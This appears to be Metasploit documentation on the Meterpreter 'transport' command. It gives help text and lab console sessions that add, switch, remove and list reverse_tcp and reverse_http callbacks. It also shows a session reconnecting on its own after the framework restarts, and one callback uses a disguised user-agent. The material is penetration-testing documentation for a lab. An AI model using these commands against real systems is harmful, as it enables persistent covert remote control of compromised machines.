## On this page
## Transport configuration
## The `transport` command
The following output shows the current help text for the `transport` command:
```msf
meterpreter > transport
Usage: transport <list|change|add|next|prev|remove> [options]

   list: list the currently active transports.
    add: add a new transport to the transport list.
 change: same as add, but changes directly to the added entry.
   next: jump to the next transport in the list (no options).
   prev: jump to the previous transport in the list (no options).
 remove: remove an existing, non-active transport.

OPTIONS:

    -A <opt>  User agent for HTTP/S transports (optional)
    -B <opt>  Proxy type for HTTP/S transports (optional: http, socks; default: http)
    -C <opt>  Comms timeout (seconds) (default: same as current session)
    -H <opt>  Proxy host for HTTP/S transports (optional)
    -N <opt>  Proxy password for HTTP/S transports (optional)
    -P <opt>  Proxy port for HTTP/S transports (optional)
    -T <opt>  Retry total time (seconds) (default: same as current session)
    -U <opt>  Proxy username for HTTP/S transports (optional)
    -W <opt>  Retry wait time (seconds) (default: same as current session)
    -X <opt>  Expiration timeout (seconds) (default: same as current session)
    -c <opt>  SSL certificate path for https transport verification (optional)
    -h        Help menu
    -i <opt>  Specify transport by index (currently supported: remove)
    -l <opt>  LHOST parameter (for reverse transports)
    -p <opt>  LPORT parameter
    -t <opt>  Transport type: reverse_tcp, reverse_http, reverse_https, bind_tcp
    -u <opt>  Local URI for HTTP/S transports (used when adding/changing transports with a custom LURI)
    -v        Show the verbose format of the transport list


```

### Listing transports
The simplest of all the sub-commands in the `transport` set is `list`. This command shows the full list of currently enabled transport, and an indicator of which one is the "current" transport. The following shows the non-verbose output with just the default transport running:
```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                    Comms T/O  Retry Total  Retry Wait
    ----  ---                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000  300        3600         10
```

The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as `reverse_http/s`). The following command shows the output of the `list` sub-command with the verbose flag (`-v`) after an `HTTP` transport has been added:
```msf
meterpreter > transport list -v
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait  User Agent               Proxy Host  Proxy User  Proxy Pass  Cert Hash
    ----  ---                                                                                                    ---------  -----------  ----------  ----------               ----------  ----------  ----------  ---------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500        Totes-Legit Browser/1.1
```

### Adding transports
The following command shows a simple example that adds a `reverse_http` transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests:
```msf
meterpreter > transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A "Totes-Legit Browser/1.1"
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
```

The following shows another example which adds another `reverse_tcp` transport to the transport list:
```msf
meterpreter > transport add -t reverse_tcp -l 10.1.10.40 -p 5005
[*] Adding new transport ...
[+] Successfully added reverse_tcp transport.
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
```

### Change transports
As an example, here is the current transport setup:
```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
```

Moving to the next transport:
```msf
meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 1 closed.  Reason: User exit
msf exploit(handler) >
[*] 10.1.10.40:46130 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[*] Meterpreter session 2 opened (10.1.10.40:5105 -> 10.1.10.40:46130) at 2015-06-02 20:53:54 +1000

msf exploit(handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

Moving to the next transport again takes the session to the second `reverse_tcp` listener:
```msf
meterpreter > transport next
[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 2 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 3 opened (10.1.10.40:5005 -> 10.1.10.35:49277) at 2015-06-02 20:54:45 +1000

msf exploit(handler) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:06

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
```

From here, moving backward sends Meterpreter back to the `reverse_http` listener:
```msf
meterpreter > transport prev
[*] Changing to previous transport ...

[*] 10.1.10.40:46245 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[+] Successfully changed to the previous transport, killing current session.

[*] 10.1.10.35 - Meterpreter session 3 closed.  Reason: User exit
msf exploit(handler) > [*] Meterpreter session 4 opened (10.1.10.40:5105 -> 10.1.10.40:46245) at 2015-06-02 20:55:07 +1000

msf exploit(handler) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

### Remove transports
* `-u` - This value is only required for `reverse_http/s` transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions.
```msf
[*] Starting interaction with 2...

meterpreter > transport list
Session Expiry  : @ 2015-07-10 07:39:08

    Curr  URL                                                                                                             Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                             ---------  -----------  ----------
    *     tcp://10.1.10.40:5000                                                                                           300        3600         10
          http://10.1.10.40:9090/jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ/  300        3600         10

meterpreter > transport remove -t reverse_http -l 10.1.10.40 -p 9090 -u jYGS61OX8On-Dv8Pq5v9FAJAEobAlrL4J2FBOf_3DsnZzCJAY6-Dh_8AeWdrkFwRbQdvz4vOo8let4huygVLPJ
[*] Removing transport ...
[+] Successfully removed reverse_http transport.
meterpreter > transport list
Session Expiry  : @ 2015-07-10 07:39:08

    Curr  URL                    Comms T/O  Retry Total  Retry Wait
    ----  ---                    ---------  -----------  ----------
    *     tcp://10.1.10.40:5000  300        3600         10

meterpreter >
```

### Resilient transports
The following shows Metasploit being closed and leaving the existing `TCP` session running behind the scenes:
```msf
meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     tcp://10.1.10.40:6000                                                                                  300        3600         10
          http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10

meterpreter > background
[*] Backgrounding session 5...
msf exploit(handler) > exit -y
```

The following output shows Metasploit being re-launched with the appropriate listeners, and the existing Meterpreter instance establishing a session automatically:
```msf
./msfconsole -r ~/msf.rc
[*] Starting the Metasploit Framework console...|
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]
+ -- --=[ 1460 exploits - 835 auxiliary - 229 post        ]
+ -- --=[ 426 payloads - 37 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

... snip ...

[*] 10.1.10.40:46457 (UUID: 8e97549ed2baf6a8/x86_64=2/windows=1/2015-06-02T09:56:05Z) Attaching orphaned/stageless session ...
[*] Meterpreter session 1 opened (10.1.10.40:5105 -> 10.1.10.40:46457) at 2015-06-02 21:03:55 +1000

msf exploit(handler) > sessions -l

Active sessions
===============

  Id  Type                   Information                           Connection
  --  ----                   -----------                           ----------
  1   meterpreter x86/win32  WIN-S45GUQ5KGVK\OJ @ WIN-S45GUQ5KGVK  10.1.10.40:5105 -> 10.1.10.40:46457 (10.1.10.35)

msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > transport list
Session Expiry  : @ 2015-06-09 19:56:05

    Curr  URL                                                                                                    Comms T/O  Retry Total  Retry Wait
    ----  ---                                                                                                    ---------  -----------  ----------
    *     http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/  100000     50000        2500
          tcp://10.1.10.40:5005                                                                                  300        3600         10
          tcp://10.1.10.40:6000                                                                                  300        3600         10
```

